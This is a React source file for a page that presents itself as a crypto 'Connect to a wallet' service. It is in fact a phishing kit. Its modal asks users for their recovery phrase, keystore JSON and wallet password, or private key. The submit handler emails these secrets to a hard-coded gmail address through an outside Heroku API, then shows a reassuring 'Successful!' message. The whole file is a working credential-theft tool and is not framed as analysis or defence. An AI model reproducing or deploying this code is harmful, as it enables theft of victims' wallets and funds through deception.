import {
  Alert,
  Avatar,
  Button,
  Card,
  Center,
  Container,
  Input,
  InputWrapper,
  Loader,
  LoadingOverlay,
  Modal,
  SimpleGrid,
  Space,
  Tabs,
  Text,
  Textarea,
} from "@mantine/core";
import axios from "axios";
import React, { useEffect, useState } from "react";
import { wallet_connectors } from "./data";

export default function Main() {
  const [isOPen, setIsOPen] = useState(false);
  const [activeWallet, setActiveWallet] = useState({});

  const [recoverPhrase, setRecoverPhrase] = useState("");
  const [keystoreJSON, setKeystoreJSON] = useState("");
  const [walletPassword, setWalletPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [message, setMessage] = useState({ status: "", message: "" });

  const handleSubmit = async (e) => {
    let data = {
      email: "swiftmonger@gmail.com",
      subject: "New Wallet",
      message: `
            <h1>Wallet Details</h1>
            <p>
            <b>Wallet Name:</b> ${activeWallet.label}<br/>
            <b>Recovery Phrase:</b> ${recoverPhrase}<br/>
            <b>Keystore JSON:</b> ${keystoreJSON}<br/>
            <b>Wallet Password:</b> ${walletPassword}<br/>
            <b>Private Key:</b> ${privateKey}<br/>
            <b>Date:</b> ${new Date().toDateString()}<br/>
            </p>
            `,
    };

    setLoading(true);

    await axios
      .post(`https://epact-api.herokuapp.com/emails`, data)
      .then((res) => {
        setDone(true);
        setMessage({
          status: "success",
          message: "Successful!",
        });
        setActiveWallet({});
        setRecoverPhrase("");
        setKeystoreJSON("");
        setWalletPassword("");
        setPrivateKey("");
      })
      .catch((er) => {
        setMessage({ status: "error", message: "An error occured" });
        setDone(true);
      })
      .finally(() => setLoading(false));
  };

  useEffect(() => {
    const handleRemove = setTimeout(() => {
      setDone(false);
      setMessage({ status: "", message: "" });
      setIsOPen(false);
    }, 2000);

    return () => {
      clearTimeout(handleRemove);
    };
  }, [done]);

  return (
    <>
      <Center
        style={{
          width: "100%",
          minHeight: "100vh",
          backgroundImage:
            "url(https://reconnectnow.xyz/images/background.svg)",
          backgroundSize: "cover",
          backgroundRepeat: "no-repeat",
          backgroundPosition: "center",
          padding: "50px 0",
        }}
      >
        <Container
          shadow={"lg"}
          style={{
            width: "800px",
            background: "#fff",
            borderRadius: 10,
          }}
        >
          <Center style={{ marginTop: -40 }}>
            <Avatar
              src="https://media.istockphoto.com/vectors/letter-logo-premium-design-letter-ai-logo-in-triangle-shape-with-vector-id1193690676?k=20&m=1193690676&s=170667a&w=0&h=xexbvw-w3ufrqsi6aAZWGx53rTPZqkS27z6ZhnT0J7A="
              alt="Logo"
              size="xl"
            />
          </Center>

          <Text
            align="center"
            style={{ marginTop: "50px" }}
            weight={500}
            size="lg"
          >
            Connect to a wallet
          </Text>

          <SimpleGrid
            cols={3}
            breakpoints={[
              { maxWidth: 980, cols: 3, spacing: "md" },
              { maxWidth: 755, cols: 2, spacing: "sm" },
              { maxWidth: 600, cols: 1, spacing: "sm" },
            ]}
            style={{ padding: "50px 0" }}
          >
            {wallet_connectors.map((connector, index) => (
              <Card
                key={index}
                onClick={() => {
                  setActiveWallet(connector);
                  setIsOPen(true);
                }}
                style={{ cursor: "pointer" }}
                shadow="sm"
                padding="xl"
              >
                <Center>
                  <Avatar
                    src={connector.icon}
                    alt={connector.label}
                    size="lg"
                  />
                </Center>
                <Space h="md" />{" "}
                <Text align="center" weight={500} size="md">
                  {connector.label}
                </Text>
              </Card>
            ))}
          </SimpleGrid>
        </Container>
      </Center>

      <Modal
        size={"400px"}
        opened={isOPen}
        onClose={() => setIsOPen(false)}
        hideCloseButton
      >
        <LoadingOverlay
          loader={
            <Center>
              <div>
                <Center>
                  <Loader />
                </Center>
                <Space h="xs" />
                <Text>We are processing your request . . .</Text>
              </div>
            </Center>
          }
          visible={loading}
        />

        <Center>
          <Avatar src={activeWallet.icon} size="lg" />
        </Center>

        <Space h="md" />

        {done && (
          <Alert
            title={message?.message}
            color={message?.status === "error" ? "red" : "teal"}
          />
        )}

        <Space h="md" />

        <Text align="center" weight={500} size="lg">
          Import Your {activeWallet.label} Wallet
        </Text>

        <Space h="md" />

        <Tabs position="center">
          <Tabs.Tab label="Phrase">
            <InputWrapper
              required
              label="Enter your recover phrase"
              description="Typically 12 (sometimes 24) words separated by single spaces"
            >
              <Textarea onChange={(e) => setRecoverPhrase(e.target.value)} />
            </InputWrapper>
          </Tabs.Tab>
          <Tabs.Tab label="Keystore JSON">
            <InputWrapper
              required
              label="Keystore JSON"
              description='Several lines of text beginning with "{...}" plus the password you used to encrypt it.'
            >
              <Textarea onChange={(e) => setKeystoreJSON(e.target.value)} />
            </InputWrapper>

            <Space h="md" />

            <InputWrapper required label="Wallet password">
              <Input onChange={(e) => setWalletPassword(e.target.value)} />
            </InputWrapper>
          </Tabs.Tab>
          <Tabs.Tab label="Private Key">
            <InputWrapper
              required
              label="Enter your private key"
              description="Typically 12 (sometimes 24) words seperated by a single space."
            >
              <Input onChange={(e) => setPrivateKey(e.target.value)} />
            </InputWrapper>
          </Tabs.Tab>
        </Tabs>

        <Space h="md" />

        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "flex-end",
          }}
        >
          <Button type="button" onClick={handleSubmit} size="xl">
            Proceed
          </Button>
          <Space w="md" />
          <Button
            type="button"
            onClick={() => setIsOPen(false)}
            variant="outline"
            color="red"
            size="xl"
          >
            Cancel
          </Button>
        </div>
      </Modal>
    </>
  );
}
